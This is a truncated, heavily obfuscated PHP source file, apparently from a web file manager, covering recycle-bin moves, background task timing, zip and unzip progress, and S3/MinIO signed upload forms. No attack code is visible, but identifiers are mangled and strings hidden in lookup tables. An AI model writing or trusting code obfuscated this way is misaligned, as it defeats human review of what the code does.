$¶ìÕ»«ê) { $´ÁàåÛ„ =& $_SERVER[ÕŸ²ó÷å]; $½ÌÛ²ºô = Model($´ÁàåÛ„[1421]); $‹œş“…û = array($´ÁàåÛ„[203] => array($´ÁàåÛ„[7], array())); foreach ($¶ìÕ»«ê as $‚‰™÷Šô) { if ($‚‰™÷Šô == $œÏ°Ÿœ) { continue; } if (!$½ÌÛ²ºô->isParentOf($œÏ°Ÿœ, $‚‰™÷Šô)) { continue; } $•¤Áúèã = $½ÌÛ²ºô->sourceInfo($‚‰™÷Šô); if ($•¤Áúèã[$´ÁàåÛ„[494]] == $´ÁàåÛ„[101]) { $‹œş“…û[] = array($´ÁàåÛ„[661] => array($´ÁàåÛ„[621], $•¤Áúèã[$´ÁàåÛ„[593]] . $‚‰™÷Šô . $´ÁàåÛ„[622])); } else { $‹œş“…û[$´ÁàåÛ„[203]][1][] = $‚‰™÷Šô; } } if (!$‹œş“…û[$´ÁàåÛ„[203]][1]) { unset($‹œş“…û[$´ÁàåÛ„[203]]); } if (!$‹œş“…û) { return; } if (is_array($‹œş“…û[$´ÁàåÛ„[203]]) && is_array($‹œş“…û[$´ÁàåÛ„[203]][1])) { $‹œş“…û[$´ÁàåÛ„[203]][1] = array_unique($‹œş“…û[$´ÁàåÛ„[203]][1]); } $‹œş“…û[$´ÁàåÛ„[1081]] = $´ÁàåÛ„[2074]; $½ÌÛ²ºô->where($‹œş“…û)->setField($´ÁàåÛ„[514], 1); } private function recycleMove($Ì³ı ®Ô, $ş«…ÉÆş = 1) { $‹¼íÉ£¹ =& $_SERVER[ÕŸ²ó÷å]; $Î„¢å‹Ø = Model($‹¼íÉ£¹[1421]); $íû¿Ï‡Ë = Model($‹¼íÉ£¹[2300]); $‰şØËÅó = array($‹¼íÉ£¹[203] => $Ì³ı ®Ô); if ($ş«…ÉÆş) { $Î„¢å‹Ø->where($‰şØËÅó)->setField($‹¼íÉ£¹[514], 1); $íû¿Ï‡Ë->eventRecycle($Ì³ı ®Ô, $‹¼íÉ£¹[2301]); } else { $Â•¦Ë = $Î„¢å‹Ø->where($‰şØËÅó)->find(); $ ŞİŞ÷ = $Â•¦Ë[$‹¼íÉ£¹[494]] == $‹¼íÉ£¹[101]; $çÌË¬à± = $Î„¢å‹Ø->fileNameAuto($Â•¦Ë[$‹¼íÉ£¹[202]], $Â•¦Ë[$‹¼íÉ£¹[32]], REPEAT_RENAME_FOLDER, $ ŞİŞ÷); if ($çÌË¬à± != $Â•¦Ë[$‹¼íÉ£¹[32]]) { $Î„¢å‹Ø->rename($Ì³ı ®Ô, $çÌË¬à±); } $Î„¢å‹Ø->where($‰şØËÅó)->setField($‹¼íÉ£¹[514], 0); $íû¿Ï‡Ë->eventRecycle($Ì³ı ®Ô, $‹¼íÉ£¹[2302]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\x65\x6d\56\x73\x6f\165\162\143\x65\123\x65\x63\162\145\164\114\x69\163\x74"; public $field = array("\163\x6f\x75\x72\x63\x65\x49\104", "\164\171\160\x65\111\104", "\143\162\x65\x61\164\x65\125\x73\x65\x72"); } goto AÒËˆ»ÑíÇ; A”Òšø”Áô: class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($äÉÊ, $…©Æ›ü = 5.0) { if (!$äÉÊ) { return; } $Â…¬® = Cache::get($äÉÊ); if (!$Â…¬® || timeFloat() - floatVal($Â…¬®) >= $…©Æ›ü) { Cache::set($äÉÊ, timeFloat(), $…©Æ›ü * 10); return !0; } return !1; } public static function timeLimitCall($´Ğà·§­, $Ñ°Ì«˜†, $”ëïÀÎ¤, $İ›àÚõÈ = 5.0) { $“‘¢ûÔà =& $_SERVER[ÕŸ²ó÷å]; if (!$´Ğà·§­ || !$Ñ°Ì«˜†) { return; } self::$asyncAdd = !0; $Û³¥Ü¦ = $“‘¢ûÔà[1879]; $„ÔËù±¥ = Cache::get($Û³¥Ü¦, !0); $°´Å‹Ÿş = array($“‘¢ûÔà[1880] => timeFloat(), $“‘¢ûÔà[1881] => timeFloat(), $“‘¢ûÔà[350] => $Ñ°Ì«˜†, $“‘¢ûÔà[1871] => $”ëïÀÎ¤, $“‘¢ûÔà[216] => $İ›àÚõÈ); if (is_array($„ÔËù±¥[$´Ğà·§­])) { $°´Å‹Ÿş[$“‘¢ûÔà[1881]] = $„ÔËù±¥[$´Ğà·§­][$“‘¢ûÔà[1881]]; } if (is_array($„ÔËù±¥[$´Ğà·§­])) { if (timeFloat() - $„ÔËù±¥[$´Ğà·§­][$“‘¢ûÔà[1880]] < $°´Å‹Ÿş[$“‘¢ûÔà[216]] * 0.3) { return; } $°´Å‹Ÿş[$“‘¢ûÔà[1881]] = $„ÔËù±¥[$´Ğà·§­][$“‘¢ûÔà[1881]]; } $„ÔËù±¥[$´Ğà·§­] = $°´Å‹Ÿş; Cache::set($Û³¥Ü¦, $„ÔËù±¥, 60); Cache::removeMemory($Û³¥Ü¦); write_log($“‘¢ûÔà[1882] . $´Ğà·§­ . $“‘¢ûÔà[84] . $Ñ°Ì«˜†, $“‘¢ûÔà[207]); } public static function timeLimitCallLoop() { $ÔÑ½˜± =& $_SERVER[ÕŸ²ó÷å]; $í€ÂÓŞ = array($ÔÑ½˜±[1883]); $è¬ãëñ‚ = in_array(strtolower(ACTION), $í€ÂÓŞ); if (!$è¬ãëñ‚ && !self::$asyncAdd) { return; } $Ã×÷†Ì¤ = $ÔÑ½˜±[1879]; $×Ú¼¥ ® = Cache::get($Ã×÷†Ì¤, !0); if (!$×Ú¼¥ ® || count($×Ú¼¥ ®) <= 0) { return; } $‰§˜­Ò = !1; $İıªµ•µ = timeFloat(); $ß¢Î« = array(); foreach ($×Ú¼¥ ® as $±Û‘àÅ„ => $îúÜ¢•) { if ($İıªµ•µ - $îúÜ¢•[$ÔÑ½˜±[1881]] > $îúÜ¢•[$ÔÑ½˜±[216]]) { $‰§˜­Ò = !0; try { Hook::apply($îúÜ¢•[$ÔÑ½˜±[350]], $îúÜ¢•[$ÔÑ½˜±[1871]]); write_log($ÔÑ½˜±[1884] . $±Û‘àÅ„ . $ÔÑ½˜±[84] . $îúÜ¢•[$ÔÑ½˜±[350]] . $ÔÑ½˜±[1885] . ACTION, $ÔÑ½˜±[207]); } catch (Exception $¸¼Ò‹Ò°) { } continue; } $ß¢Î«[$±Û‘àÅ„] = $îúÜ¢•; } if (!$‰§˜­Ò) { return; } if (!$ß¢Î«) { return Cache::remove($Ã×÷†Ì¤); } Cache::set($Ã×÷†Ì¤, $ß¢Î«, 60); Cache::removeMemory($Ã×÷†Ì¤); } public static function finished($ ü÷µä, $ƒÏÍôâÂ) { $ÀÓå–÷â =& $_SERVER[ÕŸ²ó÷å]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($ÀÓå–÷â[350] => $ ü÷µä, $ÀÓå–÷â[1871] => $ƒÏÍôâÂ); } private static function finishedRun() { $ƒ®óù =& $_SERVER[ÕŸ²ó÷å]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $ê¸»¼ñë) { try { Hook::apply($ê¸»¼ñë[$ƒ®óù[350]], $ê¸»¼ñë[$ƒ®óù[1871]]); } catch (Exception $òºÆ«ƒ) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $ºŒÙú­· =& $_SERVER[ÕŸ²ó÷å]; parent::startAfter(); Hook::bind($ºŒÙú­·[1886], array($this, $ºŒÙú­·[1887])); Hook::bind($ºŒÙú­·[1281], array($this, $ºŒÙú­·[1888])); Hook::bind($ºŒÙú­·[1889], array($this, $ºŒÙú­·[1890])); $ë±ıîä =& $this->task; $ë±ıîä[$ºŒÙú­·[1891]] = $ºŒÙú­·[1282]; if (!$ë±ıîä[$ºŒÙú­·[1662]]) { $ë±ıîä[$ºŒÙú­·[1662]] = LNG($ºŒÙú­·[1892]); } } protected function endAfter() { $£˜üöÎ =& $_SERVER[ÕŸ²ó÷å]; parent::endAfter(); Hook::unbind($£˜üöÎ[1886], array($this, $£˜üöÎ[1887])); Hook::unbind($£˜üöÎ[1281], array($this, $£˜üöÎ[1888])); Hook::unbind($£˜üöÎ[1889], array($this, $£˜üöÎ[1890])); } public function updateAfter() { $ù·¾ë² =& $_SERVER[ÕŸ²ó÷å]; $×£²Ü«¯ =& $this->task; if (!$×£²Ü«¯[$ù·¾ë²[1144]] || !$×£²Ü«¯[$ù·¾ë²[847]]) { if ($×£²Ü«¯[$ù·¾ë²[1891]] != $ù·¾ë²[398]) { return; } } if ($×£²Ü«¯[$ù·¾ë²[1891]] == $ù·¾ë²[1282]) { $ÛÊÛ‡Ò¢ = 0; if ($×£²Ü«¯[$ù·¾ë²[1826]]) { $ÛÊÛ‡Ò¢ = $×£²Ü«¯[$ù·¾ë²[1827]] / $×£²Ü«¯[$ù·¾ë²[1826]]; } $×£²Ü«¯[$ù·¾ë²[1775]] = $ÛÊÛ‡Ò¢ * 0.3; } else { if ($×£²Ü«¯[$ù·¾ë²[1891]] == $ù·¾ë²[398]) { $ÛÊÛ‡Ò¢ = $×£²Ü«¯[$ù·¾ë²[1774]] / $×£²Ü«¯[$ù·¾ë²[1144]]; $×£²Ü«¯[$ù·¾ë²[1775]] = 0.3 + $ÛÊÛ‡Ò¢ * 0.4; } else { if ($×£²Ü«¯[$ù·¾ë²[1891]] == $ù·¾ë²[120]) { $¿‡ Šî˜ = 0; if ($×£²Ü«¯[$ù·¾ë²[1828]] == $ù·¾ë²[120]) { $¿‡ Šî˜ = $×£²Ü«¯[$ù·¾ë²[1827]]; } $ÛÊÛ‡Ò¢ = ($×£²Ü«¯[$ù·¾ë²[1831]] + $¿‡ Šî˜) / $×£²Ü«¯[$ù·¾ë²[847]]; $×£²Ü«¯[$ù·¾ë²[1775]] = 0.3 + 0.4 + $ÛÊÛ‡Ò¢ * 0.3; } } } if ($×£²Ü«¯[$ù·¾ë²[1775]] > 0) { $µ¶Şä¶¿ = timeFloat() - $×£²Ü«¯[$ù·¾ë²[1777]] - $×£²Ü«¯[$ù·¾ë²[1780]]; $×£²Ü«¯[$ù·¾ë²[1781]] = $µ¶Şä¶¿ * (1 - $×£²Ü«¯[$ù·¾ë²[1775]]) / $×£²Ü«¯[$ù·¾ë²[1775]]; } } public function addFile($Ì·ßÀøš) { $š±¾óšÉ =& $_SERVER[ÕŸ²ó÷å]; $•ş½¬Ìé =& $this->task; $•·¯¼ôÒ = IO::info($Ì·ßÀøš); $•ş½¬Ìé[$š±¾óšÉ[1824]] = $•·¯¼ôÒ[$š±¾óšÉ[32]]; $•ş½¬Ìé[$š±¾óšÉ[1826]] = $•·¯¼ôÒ[$š±¾óšÉ[89]]; $•ş½¬Ìé[$š±¾óšÉ[1827]] = 0; $•ş½¬Ìé[$š±¾óšÉ[1146]] = $š±¾óšÉ[1847]; $•ş½¬Ìé[$š±¾óšÉ[1828]] = $š±¾óšÉ[1282]; $•ş½¬Ìé[$š±¾óšÉ[847]] = $•·¯¼ôÒ[$š±¾óšÉ[89]]; $•ş½¬Ìé[$š±¾óšÉ[1144]] = 1; $±¸¶Š = 0; $•ş½¬Ìé[$š±¾óšÉ[1835]] = array($š±¾óšÉ[1836] => $±¸¶Š + 1, $š±¾óšÉ[503] => $•·¯¼ôÒ[$š±¾óšÉ[32]], $š±¾óšÉ[97] => $•·¯¼ôÒ[$š±¾óšÉ[97]], $š±¾óšÉ[591] => $•·¯¼ôÒ[$š±¾óšÉ[591]] ? $•·¯¼ôÒ[$š±¾óšÉ[591]] : $•·¯¼ôÒ[$š±¾óšÉ[97]]); $this->update(); } public function zipEvent($ÚÆùº¼ø, $ŞÑØ²ÎŸ, $óğØæø , $’îâô²Ğ) { $ïÄíÑµÑ =& $_SERVER[ÕŸ²ó÷å]; $ûÊú†¸Œ =& $this->task; $ûÊú†¸Œ[$ïÄíÑµÑ[1824]] = get_path_this($ŞÑØ²ÎŸ); $ûÊú†¸Œ[$ïÄíÑµÑ[1826]] = $’îâô²Ğ; $ûÊú†¸Œ[$ïÄíÑµÑ[1827]] = $óğØæø ; $ûÊú†¸Œ[$ïÄíÑµÑ[1146]] = $ÚÆùº¼ø == $ïÄíÑµÑ[1893] ? $ïÄíÑµÑ[1894] : $ïÄíÑµÑ[1895]; $ûÊú†¸Œ[$ïÄíÑµÑ[1828]] = $ïÄíÑµÑ[12]; $ûÊú†¸Œ[$ïÄíÑµÑ[847]] = $’îâô²Ğ; $ûÊú†¸Œ[$ïÄíÑµÑ[1891]] = $ïÄíÑµÑ[398]; $this->update(); } public function unzipAfter($³¡€¾õ¿) { $ÉƒÏš² =& $_SERVER[ÕŸ²ó÷å]; $¨¹ÛÓğÙ =& $this->task; $¨¹ÛÓğÙ[$ÉƒÏš²[1891]] = $ÉƒÏš²[120]; $–›û½ï² = IO::infoWithChildren($³¡€¾õ¿); $áîÆŒä¹ = 0; $¨¹ÛÓğÙ[$ÉƒÏš²[1835]] = array($ÉƒÏš²[1836] => $áîÆŒä¹ + 1, $ÉƒÏš²[503] => $–›û½ï²[$ÉƒÏš²[32]], $ÉƒÏš²[97] => $–›û½ï²[$ÉƒÏš²[97]], $ÉƒÏš²[591] => $–›û½ï²[$ÉƒÏš²[591]] ? $–›û½ï²[$ÉƒÏš²[591]] : $–›û½ï²[$ÉƒÏš²[97]]); if ($–›û½ï²[$ÉƒÏš²[33]] == $ÉƒÏš²[240]) { $¨¹ÛÓğÙ[$ÉƒÏš²[1144]] = 1; } else { $¨¹ÛÓğÙ[$ÉƒÏš²[1144]] = $–›û½ï²[$ÉƒÏš²[92]][$ÉƒÏš²[90]]; } $¨¹ÛÓğÙ[$ÉƒÏš²[1146]] = $ÉƒÏš²[12]; $¨¹ÛÓğÙ[$ÉƒÏš²[1828]] = 0; $¨¹ÛÓğÙ[$ÉƒÏš²[1774]] = 0; $¨¹ÛÓğÙ[$ÉƒÏš²[1826]] = 0; $¨¹ÛÓğÙ[$ÉƒÏš²[1827]] = 0; $¨¹ÛÓğÙ[$ÉƒÏš²[1824]] = $ÉƒÏš²[12]; $¨¹ÛÓğÙ[$ÉƒÏš²[1831]] = 0; $¨¹ÛÓğÙ[$ÉƒÏš²[847]] = $–›û½ï²[$ÉƒÏš²[89]]; $this->update(); self::log($ÉƒÏš²[1896] . json_encode(array($¨¹ÛÓğÙ, $–›û½ï²))); } public function nameParse($ıùİÜ‚³) { $ß€ØıÛÃ =& $_SERVER[ÕŸ²ó÷å]; $üà«†ÛÙ =& $this->task; if ($üà«†ÛÙ[$ß€ØıÛÃ[1891]] == $ß€ØıÛÃ[1282]) { $üà«†ÛÙ[$ß€ØıÛÃ[1891]] = $ß€ØıÛÃ[398]; $üà«†ÛÙ[$ß€ØıÛÃ[1831]] = 0; $üà«†ÛÙ[$ß€ØıÛÃ[847]] = 0; } $éå‡úÃ² = get_path_this($ıùİÜ‚³); if (strstr($éå‡úÃ², $ß€ØıÛÃ[10])) { $üà«†ÛÙ[$ß€ØıÛÃ[1774]] += 1; $üà«†ÛÙ[$ß€ØıÛÃ[1144]] += 1; } $üà«†ÛÙ[$ß€ØıÛÃ[1824]] = $ıùİÜ‚³; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $È±‘Óø“ =& $_SERVER[ÕŸ²ó÷å]; parent::startAfter(); Hook::bind($È±‘Óø“[1897], array($this, $È±‘Óø“[1887])); Hook::bind($È±‘Óø“[1889], array($this, $È±‘Óø“[1890])); $Ú®ÅÅ°° =& $this->task; $Ú®ÅÅ°°[$È±‘Óø“[1891]] = $È±‘Óø“[1282]; if (!$Ú®ÅÅ°°[$È±‘Óø“[1662]]) { $Ú®ÅÅ°°[$È±‘Óø“[1662]] = LNG($È±‘Óø“[1898]); } } protected function endAfter() { $ˆÜ–´ =& $_SERVER[ÕŸ²ó÷å]; parent::endAfter(); Hook::unbind($ˆÜ–´[1897], array($this, $ˆÜ–´[1887])); Hook::unbind($ˆÜ–´[1889], array($this, $ˆÜ–´[1890])); } public function updateAfter() { $Ï™ßªÓĞ =& $_SERVER[ÕŸ²ó÷å]; $äªœüŸ€ =& $this->task; if (!$äªœüŸ€[$Ï™ßªÓĞ[1144]] || !$äªœüŸ€[$Ï™ßªÓĞ[847]]) { return; } if ($äªœüŸ€[$Ï™ßªÓĞ[1891]] == $Ï™ßªÓĞ[1282]) { $ØÚ¸öÇÙ = $äªœüŸ€[$Ï™ßªÓĞ[1827]]; if ($äªœüŸ€[$Ï™ßªÓĞ[1828]] != $Ï™ßªÓĞ[1282]) { $ØÚ¸öÇÙ = 0; } $ƒæí”Äª = ($äªœüŸ€[$Ï™ßªÓĞ[1831]] + $ØÚ¸öÇÙ) / $äªœüŸ€[$Ï™ßªÓĞ[847]]; $äªœüŸ€[$Ï™ßªÓĞ[1775]] = $ƒæí”Äª * 0.3; } else { if ($äªœüŸ€[$Ï™ßªÓĞ[1891]] == $Ï™ßªÓĞ[398]) { $ƒæí”Äª = $äªœüŸ€[$Ï™ßªÓĞ[1774]] / $äªœüŸ€[$Ï™ßªÓĞ[1144]]; $äªœüŸ€[$Ï™ßªÓĞ[1775]] = 0.3 + $ƒæí”Äª * 0.5; } else { if ($äªœüŸ€[$Ï™ßªÓĞ[1891]] == $Ï™ßªÓĞ[120]) { $ƒæí”Äª = 0; if ($äªœüŸ€[$Ï™ßªÓĞ[1826]]) { $ƒæí”Äª = $äªœüŸ€[$Ï™ßªÓĞ[1827]] / $äªœüŸ€[$Ï™ßªÓĞ[1826]]; } $äªœüŸ€[$Ï™ßªÓĞ[1775]] = 0.3 + 0.5 + $ƒæí”Äª * 0.2; } } } if ($äªœüŸ€[$Ï™ßªÓĞ[1775]] > 0) { $Ë±‘»È = timeFloat() - $äªœüŸ€[$Ï™ßªÓĞ[1777]] - $äªœüŸ€[$Ï™ßªÓĞ[1780]]; $äªœüŸ€[$Ï™ßªÓĞ[1781]] = $Ë±‘»È * (1 - $äªœüŸ€[$Ï™ßªÓĞ[1775]]) / $äªœüŸ€[$Ï™ßªÓĞ[1775]]; } } public function copyFileStart($û§ë‰è, $ÙóÃÕÄÇ, $İûíÀÖÒ, $“æŠüĞ, $ëäõÇ¾Î, $¬›ƒèå‚) { $ªÑëà”Æ =& $_SERVER[ÕŸ²ó÷å]; parent::copyFileStart($û§ë‰è, $ÙóÃÕÄÇ, $İûíÀÖÒ, $“æŠüĞ, $ëäõÇ¾Î, $¬›ƒèå‚); $üËàú =& $this->task; if ($üËàú[$ªÑëà”Æ[1891]] == $ªÑëà”Æ[398]) { $üËàú[$ªÑëà”Æ[1891]] = $ªÑëà”Æ[120]; } $this->update(); } public function copyFileEnd($Åƒ¬Òé, $óŠùéá, $ø‚Ôå¢ê, $¸¼È·ÚÂ, $Ü³ç®¹, $û¨Åóí) { $è©Öšâ… =& $_SERVER[ÕŸ²ó÷å]; $ğÂ¿–ñ¦ =& $this->task; $ğÂ¿–ñ¦[$è©Öšâ…[1827]] = $ğÂ¿–ñ¦[$è©Öšâ…[1826]]; $ğÂ¿–ñ¦[$è©Öšâ…[1831]] += $ğÂ¿–ñ¦[$è©Öšâ…[1826]]; $ğÂ¿–ñ¦[$è©Öšâ…[1828]] = $è©Öšâ…[12]; $this->update(); } public function zipEvent($„Ë­¾æ, $‘º‡¾û©, $ôû±¼Ê, $§˜ƒù•) { $‡¾ÈòÕİ =& $_SERVER[ÕŸ²ó÷å]; $ß«Úô‹Ò =& $this->task; $ß«Úô‹Ò[$‡¾ÈòÕİ[1824]] = get_path_this($‘º‡¾û©); $ß«Úô‹Ò[$‡¾ÈòÕİ[1826]] = $§˜ƒù•; $ß«Úô‹Ò[$‡¾ÈòÕİ[1827]] = $ôû±¼Ê; $ß«Úô‹Ò[$‡¾ÈòÕİ[1146]] = $„Ë­¾æ == $‡¾ÈòÕİ[1899] ? $‡¾ÈòÕİ[1894] : $‡¾ÈòÕİ[1895]; $ß«Úô‹Ò[$‡¾ÈòÕİ[1828]] = $‡¾ÈòÕİ[12]; $ß«Úô‹Ò[$‡¾ÈòÕİ[847]] = $§˜ƒù•; $ß«Úô‹Ò[$‡¾ÈòÕİ[1891]] = $‡¾ÈòÕİ[398]; $this->update(); } public function nameParse($ğ´Ÿ¹ÓÜ) { $¡¾İïœ™ =& $_SERVER[ÕŸ²ó÷å]; $€¬ÒÕÒß =& $this->task; if ($€¬ÒÕÒß[$¡¾İïœ™[1774]] < $€¬ÒÕÒß[$¡¾İïœ™[1144]]) { $‘©ğ˜è¤ = get_path_this($ğ´Ÿ¹ÓÜ); if (strstr($‘©ğ˜è¤, $¡¾İïœ™[10])) { $€¬ÒÕÒß[$¡¾İïœ™[1774]] += 1; } } if ($€¬ÒÕÒß[$¡¾İïœ™[1891]] == $¡¾İïœ™[1282]) { $€¬ÒÕÒß[$¡¾İïœ™[1891]] = $¡¾İïœ™[398]; } $€¬ÒÕÒß[$¡¾İïœ™[1824]] = $ğ´Ÿ¹ÓÜ; $this->update(); } } goto c…òµŒÚ±ó; dòÎª©¿¿: define($_SERVER[ÕŸ²ó÷å][325], 2); define($_SERVER[ÕŸ²ó÷å][326], 3); define($_SERVER[ÕŸ²ó÷å][327], 1); goto C“ÄƒäÜİ¼; E¢•³ÈâÈ: class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($¨Ê’¬Å“) { $ò’Ìß‹ˆ =& $_SERVER[ÕŸ²ó÷å]; parent::__construct($¨Ê’¬Å“); $this->setSignVersion($ò’Ìß‹ˆ[257]); if (!$this->region) { $this->region = $ò’Ìß‹ˆ[278]; $this->client->setRegion($this->region); } $this->client->setHeadValid(!1); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function checkRegion() { $Ú´†¸êØ = $this->getBucketRgn(); return $this->region == $Ú´†¸êØ ? !0 : !1; } public function uploadFormData($¤¹¹Ç¦É, $ƒ¥€ïóŞ = 3600) { $ãá„›ùÛ =& $_SERVER[ÕŸ²ó÷å]; $»•¸Ï = $ãá„›ùÛ[239]; $ÓºšüÜÕ = $ãá„›ùÛ[279]; $ğ‘šÑÁŸ = $ãá„›ùÛ[72]; $×“Ê‚¼ = gmdate($ãá„›ùÛ[280]); $ë£ŸĞ…£ = gmdate($ãá„›ùÛ[281]); $Âóà‰Ø­ = $ãá„›ùÛ[282]; $áÓ©¬˜¾ = $ƒ¥€ïóŞ . $ãá„›ùÛ[12]; $š˜¿Ñ§¢ = $ãá„›ùÛ[283]; $æâ¡ëËÚ = array($this->accessKey, $ë£ŸĞ…£, $this->region, $ğ‘šÑÁŸ, $Âóà‰Ø­); $†‚úúü = implode($ãá„›ùÛ[8], $æâ¡ëËÚ); $ã§ûÜ¦× = array($ãá„›ùÛ[284] => gmdate($ãá„›ùÛ[285], strtotime($ãá„›ùÛ[286])), $ãá„›ùÛ[287] => array(array($ãá„›ùÛ[288] => $this->bucket), array($ãá„›ùÛ[289] => $»•¸Ï), array($ãá„›ùÛ[290], $ãá„›ùÛ[291], $ãá„›ùÛ[12]), array($ãá„›ùÛ[290], $ãá„›ùÛ[292], $ãá„›ùÛ[12]), array($ãá„›ùÛ[290], $ãá„›ùÛ[293], $ãá„›ùÛ[12]), array($ãá„›ùÛ[294] => $š˜¿Ñ§¢), array($ãá„›ùÛ[295] => $†‚úúü), array($ãá„›ùÛ[296] => $ÓºšüÜÕ), array($ãá„›ùÛ[297] => $×“Ê‚¼), array($ãá„›ùÛ[298] => $áÓ©¬˜¾))); $ÔØÙòùÓ = base64_encode(json_encode($ã§ûÜ¦×)); $ÊüñÔíÇ = hash_hmac($ãá„›ùÛ[299], $ë£ŸĞ…£, $ãá„›ùÛ[300] . $this->secret, !0); $“†¥‹Û = hash_hmac($ãá„›ùÛ[299], $this->region, $ÊüñÔíÇ, !0); $óüèÑ©Ó = hash_hmac($ãá„›ùÛ[299], $ğ‘šÑÁŸ, $“†¥‹Û, !0); $™ßÃ„¯İ = hash_hmac($ãá„›ùÛ[299], $Âóà‰Ø­, $óüèÑ©Ó, !0); $àúÍØË† = hash_hmac($ãá„›ùÛ[299], $ÔØÙòùÓ, $™ßÃ„¯İ); $šêÄúˆ¶ = array($ãá„›ùÛ[256] => $ãá„›ùÛ[12], $ãá„›ùÛ[301] => $ãá„›ùÛ[12], $ãá„›ùÛ[289] => $»•¸Ï, $ãá„›ùÛ[294] => $š˜¿Ñ§¢, $ãá„›ùÛ[302] => $ÔØÙòùÓ, $ãá„›ùÛ[303] => $†‚úúü, $ãá„›ùÛ[304] => $ÓºšüÜÕ, $ãá„›ùÛ[305] => $×“Ê‚¼, $ãá„›ùÛ[306] => $áÓ©¬˜¾, $ãá„›ùÛ[307] => $àúÍØË†, $ãá„›ùÛ[218] => $this->getHost()); return $šêÄúˆ¶; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($½ˆñßÔø) { parent::__construct($½ˆñßÔø); } public function uploadFormData($Šêš–Ä¹, $Ç±‰° İ = 3600) { $Ø÷×³ù¸ =& $_SERVER[ÕŸ²ó÷å]; $‰…†ÁË» = $Ø÷×³ù¸[239]; $ü‰ôË˜ = $Ø÷×³ù¸[279]; $›·ğÙ× = $Ø÷×³ù¸[72]; $ğú‚Î«º = gmdate($Ø÷×³ù¸[280]); $½ß€ÊùÊ = gmdate($Ø÷×³ù¸[281]); $°•³Ÿï• = $Ø÷×³ù¸[282]; $¦åÔ¶õö = $Ç±‰° İ . $Ø÷×³ù¸[12]; $õ¸™óÈ¼ = $Ø÷×³ù¸[283]; $ã„ü·˜û = array($this->accessKey, $½ß€ÊùÊ, $this->region, $›·ğÙ×, $°•³Ÿï•); $œ·ä©¸ = implode($Ø÷×³ù¸[8], $ã„ü·˜û); $æüş—÷¬ = array($Ø÷×³ù¸[284] => gmdate($Ø÷×³ù¸[308], strtotime($Ø÷×³ù¸[286])), $Ø÷×³ù¸[287] => array(array($Ø÷×³ù¸[288] => $this->bucket), array($Ø÷×³ù¸[289] => $‰…†ÁË»), array($Ø÷×³ù¸[290], $Ø÷×³ù¸[291], $Ø÷×³ù¸[12]), array($Ø÷×³ù¸[290], $Ø÷×³ù¸[292], $Ø÷×³ù¸[12]), array($Ø÷×³ù¸[290], $Ø÷×³ù¸[293], $Ø÷×³ù¸[12]), array($Ø÷×³ù¸[294] => $õ¸™óÈ¼), array($Ø÷×³ù¸[295] => $œ·ä©¸), array($Ø÷×³ù¸[296] => $ü‰ôË˜), array($Ø÷×³ù¸[297] => $ğú‚Î«º), array($Ø÷×³ù¸[298] => $¦åÔ¶õö))); $ÆäîŒ½Š = base64_encode(json_encode($æüş—÷¬)); $•é«Í’ô = hash_hmac($Ø÷×³ù¸[299], $½ß€ÊùÊ, $Ø÷×³ù¸[300] . $this->secret, !0); $Šâ»Ì›” = hash_hmac($Ø÷×³ù¸[299], $this->region, $•é«Í’ô, !0); $ø‘¯èË = hash_hmac($Ø÷×³ù¸[299], $›·ğÙ×, $Šâ»Ì›”, !0); $Ûà¢üÖÑ = hash_hmac($Ø÷×³ù¸[299], $°•³Ÿï•, $ø‘¯èË, !0); $îËÃ”áÕ = hash_hmac($Ø÷×³ù¸[299], $ÆäîŒ½Š, $Ûà¢üÖÑ); $”‡¾»úÈ = array($Ø÷×³ù¸[256] => $Ø÷×³ù¸[12], $Ø÷×³ù¸[301] => $Ø÷×³ù¸[12], $Ø÷×³ù¸[289] => $‰…†ÁË», $Ø÷×³ù¸[294] => $õ¸™óÈ¼, $Ø÷×³ù¸[302] => $ÆäîŒ½Š, $Ø÷×³ù¸[303] => $œ·ä©¸, $Ø÷×³ù¸[304] => $ü‰ôË˜, $Ø÷×³ù¸[305] => $ğú‚Î«º, $Ø÷×³ù¸[306] => $¦åÔ¶õö, $Ø÷×³ù¸[307] => $îËÃ”áÕ, $Ø÷×³ù¸[218] => $this->getHost()); return $”‡¾»úÈ; } public function multiUploadFormData($ÛØ…±½ç, $³ÏÂ ê = 3600) { $ôÌ¿âÂÈ =& $_SERVER[ÕŸ²ó÷å]; $°Öş˜ = gmdate($ôÌ¿âÂÈ[309]); $šŞ³Áı = array(); $‡Ë×† = $this->client->getUploadId($this->bucket, $ÛØ…±½ç, $šŞ³Áı); if (!$‡Ë×†) { return !1; } return array($ôÌ¿âÂÈ[264] => $‡Ë×†, $ôÌ¿âÂÈ[218] => $this->getHost() . $ôÌ¿âÂÈ[8] . $this->pathEncode($ÛØ…±½ç), $ôÌ¿âÂÈ[265] => $°Öş˜, $ôÌ¿âÂÈ[107] => $ÛØ…±½ç); } public function multiUploadAuthData($¶ÌÃ²÷í, $ĞĞûİÖ = array()) { $³ø§õÃİ =& $_SERVER[ÕŸ²ó÷å]; $Ï¤æ¶…¾ = isset($ĞĞûİÖ[$³ø§õÃİ[179]]) ? $ĞĞûİÖ[$³ø§õÃİ[179]] : $³ø§õÃİ[12]; $ıâ€­À“ = $ĞĞûİÖ[$³ø§õÃİ[107]]; unset($ĞĞûİÖ[$³ø§õÃİ[107]]); if (isset($ĞĞûİÖ[$³ø§õÃİ[266]])) { return $this->listUploadParts($ıâ€­À“, $ĞĞûİÖ); } $Å˜ôë = array(); if (isset($ĞĞûİÖ[$³ø§õÃİ[310]])) { $Å˜ôë[$³ø§õÃİ[311]] = $ĞĞûİÖ[$³ø§õÃİ[310]]; } $Ô Âşûˆ = explode($³ø§õÃİ[220], $this->getHost()); $ØŒ•Ê÷ = array($³ø§õÃİ[312] => $Ô Âşûˆ[1], $³ø§õÃİ[313] => $³ø§õÃİ[12], $³ø§õÃİ[256] => $³ø§õÃİ[133], $³ø§õÃİ[301] => $ĞĞûİÖ[$³ø§õÃİ[89]]); $³Ú½¶¡¨ = $³ø§õÃİ[269]; $ºİáÆöË = 